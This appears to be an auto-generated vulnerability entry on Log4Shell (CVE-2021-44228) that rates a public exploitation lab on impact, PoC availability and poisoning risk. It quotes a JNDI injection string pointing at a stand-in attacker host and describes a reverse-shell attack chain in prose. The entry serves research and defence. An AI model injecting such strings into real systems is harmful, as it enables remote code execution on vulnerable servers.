## CVE-2021-44228 - Apache Log4j 2 RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** RCE

**影响应用:** Apache Log4j 2

**危害等级:** Critical

**CVSS评分:** 10.0

**影响版本:** All versions from 2.0-beta9 to 2.14.1

**利用条件:** Requires network access to a vulnerable application that logs attacker-controlled data using Log4j 2.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2021-44228, also known as Log4Shell, is a critical remote code execution (RCE) vulnerability affecting Apache Log4j 2. This vulnerability allows an attacker to execute arbitrary code on a server if the server logs a specific string crafted by the attacker. The vulnerability stems from Log4j's JNDI lookup feature, which allows it to retrieve and execute Java code from remote servers. By injecting a specially crafted string like `${jndi:ldap://attacker.com/evil}`, an attacker can force Log4j to perform a JNDI lookup to an attacker-controlled server. The attacker's server then provides a malicious Java class, which Log4j downloads and executes, leading to RCE.

The provided POC code demonstrates a complete and modern exploitation lab setup for Log4Shell. It includes a Dockerized vulnerable Log4j2 application, a public PoC (`log4j-shell-poc`), and instructions for using `curl`, Burp Suite, and Netcat for exploitation. The lab environment sets up a vulnerable Log4j application and prepares an exploit PoC, including configuring it to use a specific JDK version. It then starts exploit services (LDAP + HTTP + Payload) and a reverse shell listener. The exploit is triggered by sending a crafted HTTP request to the vulnerable application, causing it to log the malicious JNDI lookup string. This leads to the download and execution of the attacker's payload, resulting in a reverse shell.

The effectiveness of the POC lies in its comprehensive approach, providing a fully reproducible environment for understanding and demonstrating the vulnerability. The steps are well-documented, making it suitable for educational purposes, research, and defensive awareness training. The PoC leverages readily available tools and technologies, such as Docker, Kali Linux, and standard networking utilities, making it accessible and practical. The attack chain diagram clearly illustrates the technical flow of the exploit, aiding in comprehension. 

However, this POC does pose a moderate poisoning risk. While the provided code itself appears clean and focused on demonstrating the exploit, it relies on external payloads and LDAP servers controlled by the user. There's a potential for attackers to modify the payload or introduce malicious code into the LDAP server configuration, leading to the execution of harmful commands on the target system. The risk is amplified if users blindly copy and paste commands or configurations without understanding their implications. While the base code doesn't include malicious logic, the flexibility of the exploit allows for the inclusion of arbitrary Java code, which can be leveraged for nefarious purposes. The risk could be mitigated by sandboxing the execution environment and carefully auditing the payloads and configurations used during exploitation.

**项目地址:** https://github.com/christophetd/log4shell-lab

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2021-44228
